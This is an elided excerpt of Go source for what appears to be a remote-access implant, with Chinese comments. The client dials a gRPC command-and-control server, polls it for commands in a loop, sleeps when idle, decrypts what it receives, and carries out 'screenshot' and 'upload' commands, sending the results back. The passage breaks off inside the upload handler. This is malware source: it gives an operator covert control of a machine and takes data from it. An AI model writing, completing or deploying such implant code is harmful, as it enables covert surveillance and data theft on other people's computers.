...
func main() {
	...
	if conn, err = grpc.Dial(fmt.Sprintf("0.0.0.0:%d", 1961), opts...); err != nil { //连接服务器
		log.Fatal(err)
	}
	defer conn.Close()
	client = grpcapi.NewImplantClient(conn) //创建客户端

	ctx := context.Background()
	for {
		var req = new(grpcapi.Empty)
		cmd, err := client.FetchCommand(ctx, req) //从服务端获取命令
		if err != nil {
			log.Fatal(err)
		}
		if cmd.In == "" { //如果命令为空，就睡眠
			t, _ := client.GetSleepTime(ctx, req)
			fmt.Println("sleep" + t.String())
			time.Sleep(time.Duration(t.Time) * time.Second) //睡眠
			continue
		}
		//从服务端获取到命令后先进行解密处理
		...
		if tokens[0] == "screenshot" { //如果命令为screenshot
			...
			client.SendOutput(ctx, cmd) //将结果发送给服务端
			continue
		}
		//匹配上传命令
		if tokens[0] == "upload" { //如果命令为upload
			//fmt.Println(cmd.Out)
